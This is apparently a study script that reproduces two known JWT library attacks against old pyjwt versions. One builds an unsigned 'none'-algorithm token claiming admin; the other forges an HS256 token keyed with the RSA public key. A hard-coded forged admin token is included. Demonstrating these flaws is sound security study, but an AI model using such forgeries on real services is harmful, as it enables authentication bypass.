import jwt
from jwt.utils import base64url_decode, base64url_encode
import json
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.serialization import load_pem_private_key, load_pem_public_key

"""
This script tries to demonstrate the JWT exploits mentioned in:
    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries
    - https://github.com/jpadilla/pyjwt/releases/tag/1.0.0

Check the file requirements.txt to play around with the different pyjwt and cryptography versions.
"""

# These tokens can be used if the cryptography commands are disabled due to compatibility issues
rsa_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbkFzIjoidXNlciJ9.DVGlPR3dC7TTg5Bxaj1hFYID-zlwWne_keZzshuECs4-ck2p61voSNI1M7VXP6qIhOupGlrK41kYXTUqcMhlC1AAgDnLArrBdPRFxPINbJULoxVndVKNIFXv25TI_HgqFYrY_dAWbCqaFh-qfCn3-FNUyRdWRz0jz5kQnZQX3p89iHgksAPuPCAIJvwdSmswNucscQHAkDOhkLALJXTBFgKGCJ7GXFRz5dmNIMmDeSSTJ0dLOTDjY3VbSEicreHyzJXozfw2BB-oPDIhe6s-kJi4BqRa5jPZTstAd_hOlL380YMGI75aDAo-TofXVtb3ZcJUoebBGh8AVqoNI7OgYg"
forged_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbkFzIjoiYWRtaW4ifQ.vmKyk7yYx4s4LxnH4lzVTyrLc-ZFeUDuvPqFHH5N0Rs"

"""
1. This is the normal use case for jwt. Sign a token which can not be forged with the known exploit.
"""

# Generate a token
header = {"alg": "HS256", "typ": "JWT"}
payload = {"loggedInAs": "user"}
key = 'secretkey'
token = jwt.encode(payload, key, algorithm='HS256', headers=header)
print("Header: " + str(header))
print("Payload: " + str(payload))
print("Token: " + token)
print("")

# The token consists of three segments, each encoded with base64: header, payload, signature
segments = token.split('.')
print("Extracted Header: " + base64url_decode(segments[0]))
print("Extracted Payload: " + base64url_decode(segments[1]))
print("")

# Decode and verify the token with the correct key
print("Result with correct key: " + str(jwt.decode(token, key)))

# Try to decode with invalid signature
try:
    jwt.decode(token, "invalid")
except jwt.exceptions.DecodeError as e:
    print("Exception with wrong key: " + str(e))
print("")


"""
2. Try to forge a token with the 'none' algorithm
It seems that the python version is not affected as long as one does not override the algorithm manually.

We could test the exploit on the php or javascript library instead.
"""

none_header = {"typ": "JWT", "alg": "none"}
none_header = json.dumps(
        none_header,
        separators=(',', ':'),
    ).encode('utf-8')
none_payload = {"loggedInAs": "admin"}
none_payload = json.dumps(
        none_payload,
        separators=(',', ':'),
    ).encode('utf-8')
#none_token = jwt.encode(none_payload, 'notimportant', algorithm='none', headers=none_header)
unsigned_token = b'.'.join([base64url_encode(none_header), base64url_encode(none_payload)]) + '.'
try:
    jwt.decode(unsigned_token)
except jwt.exceptions.DecodeError as e:
    print("None algorithm still not creates a valid token: " + str(e))
print("")


"""
3. The RS256 vs. HS256 exploit
This exploit could work, if:
    - the compatible cryptography can be installed (version 0.7.1 fails with the current OpenSSL version)
    - the public key is passed as a string 'id_rsa_pub' instead of the 'private_key' object
      (this is not really an exploit but rather an implementation error)

A possibility would be to deploy the whole thing on Ubuntu 14.04 and check if the exploit works over there.

Example how to use RSA with JWT: https://github.com/jpadilla/pyjwt/pull/197/files
"""

# Load Public and Private Key
with open('id_rsa', 'r') as file_private:
    id_rsa = file_private.read()
with open('id_rsa.pub', 'r') as file_public:
    id_rsa_pub = file_public.read()

public_key = load_pem_public_key(id_rsa_pub, default_backend())
private_key = load_pem_private_key(id_rsa, None, default_backend())

#rsa_token = jwt.encode(payload, id_rsa, algorithm="RS256")  # This command fails with the old jwt version
print("RSA Token: " + str(rsa_token))
print("Verify RSA Token with Pub: " + str(jwt.decode(rsa_token, id_rsa_pub)))

forged_payload = {"loggedInAs": "admin"}
#forged_token = jwt.encode(forged_payload, id_rsa_pub, algorithm='HS256')  # This command fails with the old jwt version
print("Forged Token: " + str(forged_token))
try:
    print("Verify forged Token: " + str(jwt.decode(forged_token, id_rsa_pub)))
except jwt.exceptions.InvalidKeyError as e:
    print("Forgery detected: " + str(e))


